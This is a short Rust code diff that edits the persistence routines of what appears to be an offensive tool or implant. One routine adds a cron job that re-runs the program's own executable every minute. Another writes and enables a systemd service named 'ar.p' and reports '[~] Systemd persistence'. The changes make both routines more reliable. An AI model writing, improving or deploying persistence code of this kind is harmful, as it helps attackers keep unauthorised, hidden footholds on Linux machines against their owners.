@@ -142,10 +142,6 @@ fn crontab() {
     let expression = format!("* * * * * {}\n", env::current_exe().unwrap().to_string_lossy().to_owned());
     let mut file = env::current_dir().unwrap().to_string_lossy().into_owned();
     file.push_str("/cron");
-
-    if !Path::new(&file).exists() {
-        fs::File::create(&file).unwrap();
-    }
  
     let output = Command::new("crontab").arg("-l").output().unwrap();
     let mut task = String::from_utf8(output.stdout).unwrap().trim().to_string();
@@ -159,7 +155,7 @@ fn crontab() {
         task += expression.as_str();
         fs::write(&file, &task).unwrap();
 
-        Command::new("crontab").arg(&file).spawn().unwrap();
+        Command::new("crontab").arg(&file).output().unwrap();
         fs::remove_file(file).unwrap();
     }
     
@@ -190,7 +186,7 @@ fn systemd() {
     fs::write("/etc/systemd/system/ar.p.service", service).unwrap();
     Command::new("systemctl")
             .args(["enable","ar.p"])
-            .spawn()
+            .output()
             .unwrap();
 
     println!("[~] Systemd persistence");
